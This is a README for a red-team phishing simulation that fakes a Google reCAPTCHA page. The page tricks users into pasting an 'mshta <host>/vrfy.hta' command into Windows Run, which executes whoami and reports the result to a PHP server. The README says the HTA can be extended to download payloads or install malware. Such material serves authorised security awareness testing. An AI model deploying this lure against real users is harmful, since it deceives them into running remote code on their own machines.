# CAPTCHA Phishing Simulation - Technical Overview

This project simulates a CAPTCHA verification process for controlled phishing/security awareness training exercises. It mimics a familiar Google reCAPTCHA interface and walks the user through a short client-side action, allowing backend confirmation that the user followed instructions and executed a local payload.

## Components

### 1. `index.html`

A stylised web page that imitates Google reCAPTCHA.

* When the user clicks the "I'm not a robot" checkbox, a pseudo-verification process starts.
* The user is prompted to press Windows + R, paste a copied command (`mshta`), and hit Enter.
* This command opens an `.hta` file with embedded JScript.
* A polling mechanism checks with the server every 2 seconds to see if the `.hta` file has successfully reported in.&#x20;
* The final redirect URL (triggered once verification is confirmed) can be modified in `index.html` as required for your campaign scenario.

### 2. `vrfy.hta`

Executed via `mshta`, this file:

* Extracts the `vid` (verification ID) from the query string.
* Runs `whoami` locally via ActiveX (`WScript.Shell`).
* Sends the username and verification code to the server via an HTTP GET request (to `router.php`).

> ⚠️ This `.hta` file is a proof-of-concept. It can be modified to perform arbitrary code execution, such as launching beacons, downloading payloads, or installing malware. The author provides this code strictly for educational and authorised red team purposes and is **not responsible** for any misuse.

### 3. `verify.php`

Polled continuously by the CAPTCHA page. It checks:

* Whether a file named `verifications/{vid}.txt` exists.
* If found, returns HTTP 200 OK (triggering the green "Verification Complete" status and unlocking the button).

### 4. `router.php`

Handles the incoming GET request from `vrfy.hta`:

* Validates the presence of `vid` and `user` in the request.
* Writes the `vid` and associated user string to `verifications/{vid}.txt`.
* Returns HTTP 200 OK on success.

## Flow Summary

1. User opens `index.html`.
2. User clicks checkbox → JavaScript generates a `vid`, copies `mshta <host>/vrfy.hta?vid=<vid>` to clipboard.
3. User runs it → `.hta` executes `whoami`, submits it to `router.php`.
4. `router.php` saves output to `verifications/<vid>.txt`.
5. `verify.php` is polled → returns 200 OK once that file exists.
6. Button becomes clickable → simulated verification complete.

## Use Cases

* Security awareness training
* Social engineering simulation
* Red team exercises

## Important Notes

* The system does not perform any malicious action by default. It only reads `whoami` and confirms the user ran the `.hta`.
* The `.hta` script can be extended to perform malicious behaviour if misused — the author **disclaims all liability** for such use.
* Ensure users are informed this is a controlled, authorised simulation.
* Hosting this publicly or obfuscating intent may breach acceptable use policies.

## Deployment

* Place all files on a web server with PHP support.
* Ensure the `verifications/` directory is writable by the web server.
* Test locally before deployment to ensure clipboard copy, HTA execution, and polling all work as expected.

## Legal Warning

This tool is intended strictly for use in **authorised environments** for testing or awareness. Use against unsuspecting or unauthorised users is unethical and may be illegal.
